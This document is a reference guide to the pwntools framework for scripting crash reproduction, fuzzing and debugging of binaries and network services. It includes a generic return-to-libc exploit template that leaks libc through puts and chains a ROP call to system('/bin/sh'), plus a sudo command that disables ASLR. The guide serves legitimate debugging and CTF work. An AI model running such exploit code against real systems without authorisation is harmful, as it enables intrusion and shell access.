# pwntools — Scripted Binary / Network Interaction

**https://docs.pwntools.com/en/stable/ · https://github.com/Gallopsled/pwntools**

pwntools is a Python framework for building reproducible interactions with binaries and network services. Originally built for CTF exploitation, it's the correct tool for any situation where you need:

- A crafted input sent to a binary or network service, repeatably
- A "failing test" equivalent for a bug that only manifests with specific byte-level input
- A fuzz harness
- An exploit PoC
- Anything where you're tempted to use `echo ... | ./binary` but need more control than shell allows

**Use pwntools for Phase 5 reproduction of binary bugs and Phase 7 tests against binaries.**

---

## Install

```bash
pip install pwntools
# Or in a venv:
python -m venv .venv && source .venv/bin/activate
pip install pwntools

# Verify
python -c 'from pwn import *; print("ok")'
```

On some Linux distros you may need build deps: `apt install python3-dev libssl-dev`.

---

## The core API in five idioms

### 1. Process / Remote — the same interface

```python
from pwn import *

# Local process
p = process('./target')

# Remote service
p = remote('example.com', 1337)

# SSH (tunnel to a remote process)
shell = ssh('user', 'host', password='...')
p = shell.process('./target', cwd='/tmp')

# Same methods on all of the above — this is the value proposition
```

### 2. I/O — the only five methods you need

```python
p.send(b'data')                      # send bytes
p.sendline(b'data')                  # send bytes + \n
p.recv(n)                            # receive up to n bytes
p.recvuntil(b'> ')                   # receive until pattern (blocks)
p.recvline()                         # receive until \n
p.interactive()                      # hand control to your terminal (for manual exploration)

# Combined
p.sendlineafter(b'prompt> ', b'payload')
p.sendafter(b'key:', key)
```

Timeouts:
```python
try:
    data = p.recvuntil(b'done', timeout=5)
except pwnlib.exception.EOFError:
    print('process died')
except TimeoutError:
    print('no response in 5s')
```

### 3. context — set arch/OS once, tools align

```python
context.binary = elf = ELF('./target')   # auto-sets arch/os/endianness
# or explicitly:
context.update(arch='amd64', os='linux', endian='little', bits=64)
```

After setting context, helpers like `asm()`, `disasm()`, `cyclic()`, and `ROP()` produce correct output for that target automatically.

### 4. ELF — parse without reverse-engineering by hand

```python
elf = ELF('./target')

elf.symbols['main']                  # address of main
elf.plt['printf']                    # address in PLT (dynamic linkage)
elf.got['printf']                    # GOT entry
elf.address = 0x555555554000         # set base for PIE binaries
elf.search(b'/bin/sh')               # find string or bytes in the binary
elf.functions['main'].address        # same as elf.symbols['main']
list(elf.functions)[:10]             # first 10 function names
```

For the libc that's linked:
```python
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.symbols['system']
```

### 5. cyclic — find offsets without counting

For "where exactly does user input reach this variable" bugs:

```python
p = process('./target')
p.sendline(cyclic(256))              # send a De Bruijn pattern
# Crash occurs; note the crash value (e.g. RIP = 0x6161616c)
offset = cyclic_find(0x6161616c)     # returns 12 (or wherever in the pattern)
# Now you know: byte 12 of your input lands at RIP
```

Saves an hour of "pad by N bytes then check" iteration.

---

## Logging during debug

pwntools logs output by default. Configure level in the script:

```python
context.log_level = 'debug'          # very verbose — shows sent/received bytes
context.log_level = 'info'           # default
context.log_level = 'warning'        # quiet
```

For long scripts, log milestones:

```python
log.info('Connected to target')
log.success('Bypassed the check')
log.failure('Canary corrupted')
log.progress('brute-forcing').status('attempt %d' % i)
```

---

## Typical debug-session patterns

### Reproduce a crash with a specific input

```python
# /tmp/debug-repro.py
from pwn import *
context.binary = './target'

p = process('./target')
p.sendlineafter(b'> ', b'<bad input that crashes>')
p.wait()
# If it crashed, p.poll() returns non-zero
assert p.poll() is not None and p.poll() != 0, 'expected crash, got clean exit'
log.success(f'confirmed crash (exit {p.poll()})')
```

Journal this script path. Run it as your "red test":

```bash
python /tmp/debug-repro.py
```

### Fuzz harness for a suspected input class

```python
# /tmp/debug-fuzz.py
from pwn import *
import random

context.binary = './target'
context.log_level = 'warning'        # keep quiet in the loop

crashes = []
for i in range(1000):
    payload = bytes(random.randint(0, 255) for _ in range(random.randint(1, 100)))
    p = process('./target')
    p.sendline(payload)
    p.wait()
    if p.poll() is not None and p.poll() < 0:   # crashed by signal
        crashes.append((payload, p.poll()))
        log.success(f'iter {i}: crash sig={-p.poll()}')

open('/tmp/debug-crashes.txt', 'w').write(repr(crashes))
log.info(f'found {len(crashes)} crashes')
```

### Automated exploit harness (CTF or self-testing a known CVE)

```python
from pwn import *
context.binary = elf = ELF('./target')
libc = elf.libc or ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('./target')

# Leak
p.sendline(b'A' * 64 + p64(elf.plt['puts']) + p64(elf.symbols['main']) + p64(elf.got['puts']))
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

# Exploit
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh')))
p.sendline(b'A' * 64 + rop.chain())

p.interactive()
```

---

## Integration with gdb / pwndbg

pwntools can launch your process under gdb:

```python
p = gdb.debug('./target', gdbscript='''
    break main
    continue
''')
```

Or attach to a running pwntools-launched process:

```python
p = process('./target')
gdb.attach(p, gdbscript='break *0x401234')
# continues in a new terminal window with gdb attached
p.sendline(b'trigger input')
```

This is the best way to debug a specific crash repeatably — pwntools drives input, gdb/pwndbg observes runtime state.

---

## Gotchas

- **Python version**: pwntools supports Python 3.8+. Very old distros may not have it.
- **`p.interactive()` blocks.** It's for manual exploration; remove it from automated scripts.
- **ASLR on local runs**: turn off for reproducibility during debugging: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` (remember to revert — journal this!).
- **`gdb.debug()` requires `gdb-multiarch`** for cross-arch binaries.
- **Subprocess cleanup**: if your script crashes, orphan `./target` processes may linger. Kill them at Phase 9 or add `atexit` cleanup.

---

## Phase 9 cleanup specifics

```bash
# Remove pwntools debug scripts
rm -f /tmp/debug-*.py
rm -f /tmp/debug-crashes.txt

# Kill orphan target processes from failed runs
pkill -f './target' || true     # adjust to actual binary name

# Restore ASLR if disabled
# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space     # Linux default

# Revert any binary patches applied for testing (see native-binary.md for details)
```
